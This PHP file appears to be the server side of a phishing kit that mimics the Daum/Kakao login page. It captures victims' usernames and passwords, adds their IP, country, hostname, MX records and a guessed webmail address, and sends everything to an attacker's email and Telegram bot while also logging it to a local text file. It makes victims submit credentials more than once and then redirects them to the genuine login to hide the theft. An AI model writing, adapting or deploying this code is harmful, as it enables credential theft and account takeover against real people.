<?php 
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");

// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    $possiblePaths = [
        __DIR__ . '/config.php',
        dirname(__DIR__) . '/config.php',
        __DIR__ . '/../config.php',
        __DIR__ . '/../../config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php',
        '/etc/config.php',
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    // Recursive search up the directory tree
    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

// Load configuration
if (!loadConfig()) {
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

$Receive_email = EMAIL;
$telegramBotToken = TG_TOKEN;
$telegramChatId = TG_CHAT_ID;
$submitLimit = defined('SUBMIT') ? (int)SUBMIT : 2;

// ==========================================
// Session tracking for submission counting
// ==========================================
function getSessionIdentifier() {
    global $session_folder;
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    return md5($ip . date('Y-m-d'));
}

$sessionId = getSessionIdentifier();
$sessionFile = sys_get_temp_dir() . '/' . $sessionId . '_submissions.txt';

$submissionCount = 0;
if (file_exists($sessionFile)) {
    $submissionCount = (int)file_get_contents($sessionFile);
}

// ==========================================
// Input handling
// ==========================================
$user = isset($_POST['user']) ? trim($_POST['user']) : '';
$pass = isset($_POST['pass']) ? trim($_POST['pass']) : '';
$userDomain = isset($_POST['userDomain']) ? trim($_POST['userDomain']) : '';

// Fallback: extract domain from user
if (empty($userDomain) && strpos($user, '@') !== false) {
    $userDomain = substr(strrchr($user, "@"), 1);
}

// ==========================================
// Determine destination URL (before logic)
// ==========================================
$kakaoFallback = 'https://accounts.kakao.com/login/?continue=https%3A%2F%2Fkauth.kakao.com%2Foauth%2Fauthorize%3Fclient_id%3D53e566aa17534bc816eb1b5d8f7415ee%26prompt%3Dselect_account%26state%3D253960fb-a1d4-47ec-a382-3df744388967%26redirect_uri%3Dhttps%253A%252F%252Flogins.daum.net%252Faccounts%252Foauth%252Fkakao%252Fcallback%26response_type%3Dcode%26auth_tran_id%3DBPDln3ZL4aBOU1Pb0p2JZS4VbXGyrZ2b5MSK3idnDsyLgM7HAHes6iR0DyF-%26ka%3Dsdk%252F2.7.6%2520os%252Fjavascript%2520sdk_type%252Fjavascript%2520lang%252Fen-US%2520device%252FWin32%2520origin%252Fhttps%25253A%25252F%25252Flogins.daum.net%2520app_key%252F53e566aa17534bc816eb1b5d8f7415ee%26is_popup%3Dfalse%26through_account%3Dtrue#login';

$mailenableDomains = ['mailenable.com', 'mewebmail.com', 'smartermail.com', 'smartertools.com'];
$domainLower = strtolower($userDomain);
$isMailEnable = false;
foreach ($mailenableDomains as $meDomain) {
    if (strpos($domainLower, $meDomain) !== false) {
        $isMailEnable = true;
        break;
    }
}

if ($isMailEnable) {
    $destination = $kakaoFallback;
} elseif (!empty($userDomain)) {
    $destination = "https://webmail.$userDomain";
} else {
    $destination = $kakaoFallback;
}

// ==========================================
// Handle submission
// ==========================================
if ($pass != null) {
    // Limit reached - redirect without logging
    if ($submissionCount >= $submitLimit) {
        header("Location: $destination");
        exit();
    }
    
    // Increment count
    $submissionCount++;
    file_put_contents($sessionFile, $submissionCount);
    
    // ==========================================
    // Gather info
    // ==========================================
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Country
    $country = "Unknown";
    try {
        $countryData = @file_get_contents("https://ipapi.co/$ip/country_name/");
        if ($countryData !== false && !empty(trim($countryData))) {
            $country = trim($countryData);
        }
    } catch (Exception $e) {
        $country = "Unknown";
    }

    if ($country === "Unknown") {
        $geoData = @file_get_contents("http://ip-api.com/json/$ip");
        if ($geoData !== false) {
            $geoJson = json_decode($geoData, true);
            if ($geoJson && isset($geoJson['status']) && $geoJson['status'] === 'success') {
                $country = $geoJson['country'] ?? 'Unknown';
            }
        }
    }

    // MX Record
    $mxRecords = @dns_get_record($userDomain, DNS_MX);
    $mxRecordString = "No MX Records Found";
    $webmailL0gin = "Not Available";
    
    if (!empty($mxRecords)) {
        $mxRecordString = implode(", ", array_column($mxRecords, 'target'));
        $mxDomain = $mxRecords[0]['target'];

        $webmailMapping = [
            'mailenable.com' => 'https://www.mailenable.com',
            'mx.mailenable.com' => 'https://www.mailenable.com',
            'mailenable' => 'https://www.mailenable.com',
            'mewebmail.com' => 'https://www.mewebmail.com',
            'mx.mewebmail.com' => 'https://www.mewebmail.com',
            'webmail.yourdomain.com' => 'https://webmail.yourdomain.com',
            'mail.yourdomain.com' => 'https://mail.yourdomain.com',
            'smartermail.com' => 'https://www.smartertools.com/smartermail',
            'smartertools.com' => 'https://www.smartertools.com/smartermail',
            'mx.yandex.ru' => 'https://mail.yandex.com',
            'mx.mail.ru' => 'https://mail.ru',
            'mx.ukr.net' => 'https://mail.ukr.net',
            'mx.gmx.net' => 'https://mail.gmx.com',
            'mx.orange.fr' => 'https://webmail.orange.fr',
            'mx.protonmail.ch' => 'https://mail.proton.me',
            'mx.web.de' => 'https://web.de',
            'mx.vodafone.it' => 'https://mail.vodafone.it',
            'mx.libero.it' => 'https://mail.libero.it',
            'mx.tiscali.it' => 'https://mail.tiscali.it',
            'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
            'mx.superonline.net' => 'https://mail.superonline.net',
            'mx.turk.net' => 'https://mail.turk.net',
            'mx.telefonica.net' => 'https://webmail.telefonica.net',
            'mx.movistar.es' => 'https://correo.movistar.es',
            'mx.uol.com.br' => 'https://email.uol.com.br',
            'mx.terra.com.br' => 'https://webmail.terra.com.br',
            'mx.bol.com.br' => 'https://email.bol.com.br',
            'stackmail.com' => 'https://stackmail.com',
            'ionos.com' => 'https://mail.ionos.com',
            'appsuite.com' => 'https://mail.appsuite.com',
            '1and1.com' => 'https://mail.ionos.com',
            'titan.email' => 'https://mail.titan.email',
            'zoho.com' => 'https://mail.zoho.com',
            'zoho.in' => 'https://mail.zoho.in',
            'zoho.eu' => 'https://mail.zoho.eu',
            'hostinger.com' => 'https://mail.hostinger.com',
            'secureserver.net' => 'https://email.godaddy.com',
            'google.com' => 'https://mail.google.com',
            'gmail.com' => 'https://mail.google.com',
            'mxhichina' => 'https://mail.mxhichina.com/alimail/',
            'emailsrvr.com' => 'https://apps.rackspace.com',
            'aruba.it' => 'https://webmail.aruba.it/',
            'naver.com' => 'https://mail.naver.com',
            'daum.net' => 'https://mail.daum.net',
            'hanmail.net' => 'https://mail.daum.net',
            'nate.com' => 'https://mail.nate.com',
            'korea.com' => 'https://mail.korea.com',
            'dreamwiz.com' => 'https://mail.dreamwiz.com',
            'freechal.com' => 'https://mail.freechal.com',
            'empas.com' => 'https://mail.empas.com',
            'paran.com' => 'https://mail.paran.com',
            'lycos.co.kr' => 'https://mail.lycos.co.kr',
            'yahoo.co.kr' => 'https://mail.yahoo.com',
            'qq.com' => 'https://mail.qq.com',
            '163.com' => 'https://mail.163.com',
            '126.com' => 'https://mail.126.com',
            'sina.com' => 'https://mail.sina.com.cn',
            'sohu.com' => 'https://mail.sohu.com',
            'tom.com' => 'https://mail.tom.com',
            '21cn.com' => 'https://mail.21cn.com',
            'yeah.net' => 'https://mail.yeah.net',
            'yahoo.com' => 'https://mail.yahoo.com',
            'yahoo.co.uk' => 'https://mail.yahoo.com',
            'yahoo.co.jp' => 'https://mail.yahoo.co.jp',
            'ymail.com' => 'https://mail.yahoo.com',
            'rocketmail.com' => 'https://mail.yahoo.com',
            'att.net' => 'https://currently.att.yahoo.com',
            'sbcglobal.net' => 'https://currently.att.yahoo.com',
            'bellsouth.net' => 'https://currently.att.yahoo.com',
            'mailgun.org' => 'https://login.mailgun.com/login/',
            'mailgun.com' => 'https://login.mailgun.com/login/',
            'horde.org' => 'https://www.horde.org/apps/webmail',
            'cpanel.net' => 'https://webmail.cpanel.net',
            'cpanel.com' => 'https://webmail.cpanel.net',
            'ovh.net' => 'https://webmail.ovh.net',
            'ovhcloud.com' => 'https://webmail.ovhcloud.com',
        ];

        if (strpos($mxDomain, 'natrohost.com') !== false) {
            $webmailL0gin = "https://mail." . $userDomain;
        } else {
            foreach ($webmailMapping as $key => $url) {
                if (strpos($mxDomain, $key) !== false) {
                    $webmailL0gin = $url;
                    break;
                }
            }
        }

        if ($webmailL0gin === "Not Available") {
            $webmailL0gin = "https://webmail." . $userDomain;
        }
    }

    // ==========================================
    // Build message
    // ==========================================
    $message = "------------------------\n";
    $message .= "Page           : Daum\n";
    $message .= "usr            : $user\n";
    $message .= "Ps             : $pass\n";
    $message .= "Country        : $country\n";
    $message .= "Timestamp      : " . date("Y-m-d H:i:s") . "\n";
    $message .= "Hostname       : $hostname\n";
    $message .= "Webmail L0gin  : $webmailL0gin\n";
    $message .= "MX Records     : $mxRecordString\n";
    $message .= "----------------------------------\n";
    $message .= "IP             : $ip\n";
    $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent     : $useragent\n";
    $message .= "Submission #   : $submissionCount of $submitLimit\n";
    $message .= "-----------------------\n";

    // Email
    $subject = "Daum | $user | $country | $ip";
    @mail($Receive_email, $subject, $message);

    // Text file log
    $filePath = __DIR__ . "/d@main123.txt";
    if ($fileHandler = @fopen($filePath, "a")) {
        @fwrite($fileHandler, $message);
        @fclose($fileHandler);
    } else {
        error_log("Unable to write to file: $filePath");
    }

    // Telegram
    $telegramMessage = urlencode($message);
    @file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage");

    // ==========================================
    // Redirect logic
    // ==========================================
    if ($submissionCount < $submitLimit) {
        // Not max attempts yet - go back to login with error
        $back = $_SERVER['HTTP_REFERER'] ?? 'kakao-login.php';
        $back = preg_replace('/[?&]attempt=\d+/', '', $back);
        $sep = (strpos($back, '?') !== false) ? '&' : '?';
        header("Location: " . $back . $sep . "attempt=" . $submissionCount);
        exit();
    }

    // Max attempts reached - redirect to destination
    header("Location: $destination");
    exit();
}

// ==========================================
// No password - show error page (fallback)
// ==========================================
header("Location: $destination");
exit();
?>